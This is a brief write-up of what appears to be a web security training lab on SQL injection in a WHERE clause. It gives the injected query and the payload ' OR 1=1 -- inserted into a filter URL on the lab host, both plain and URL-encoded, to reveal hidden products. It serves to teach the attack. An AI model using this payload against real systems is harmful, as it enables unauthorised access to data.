# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Craft the SQL query in this format 

    SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1

SQLi

    https://acbf1f0d1ec13bfac071470d00b1004b.web-security-academy.net/filter?category=' OR 1=1 --

SQLi (After URL Encoding)

    https://acbf1f0d1ec13bfac071470d00b1004b.web-security-academy.net/filter?category=%27%20OR%201=1%20--
